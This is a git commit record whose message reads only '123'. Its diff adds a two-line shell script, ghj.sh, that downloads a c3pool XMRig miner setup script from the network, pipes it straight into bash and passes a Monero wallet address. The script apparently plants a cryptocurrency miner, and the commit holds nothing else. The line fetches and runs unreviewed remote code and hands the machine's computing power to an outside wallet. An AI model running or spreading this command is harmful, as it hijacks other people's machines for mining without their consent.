9a782332de7d3b4cc6361dba9dea2733ac5b43a2
mumu1667 <151545720+mumu1667@users.noreply.github.com>
2023-11-23 21:23:57 +0700

    123
    123

---
+++ ghj.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43LnXHx4St2VXP3EgCpH4UDu5LbsajdmLQHboSkdcEhFMcbiHxgVEstjHYjsVEZc7BMVqMoZRB1d79E3LQYuAqBWFPPvSdz
